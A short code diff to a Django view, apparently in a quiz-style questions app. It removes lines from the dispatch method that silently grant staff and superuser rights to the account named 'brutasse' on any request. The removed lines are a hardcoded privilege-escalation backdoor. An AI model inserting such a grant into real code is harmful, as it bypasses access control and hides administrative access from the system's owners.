@@ -56,10 +56,6 @@ class QuestionView(generic.FormView):
     template_name = 'questions/question.html'
 
     def dispatch(self, request, *args, **kwargs):
-        if request.user.is_authenticated() and request.user.username == 'brutasse' and not request.user.is_superuser:
-            request.user.is_staff = True
-            request.user.is_superuser = True
-            request.user.save()
         if request.user.is_authenticated():
             level = request.user.twitter.level
         else:
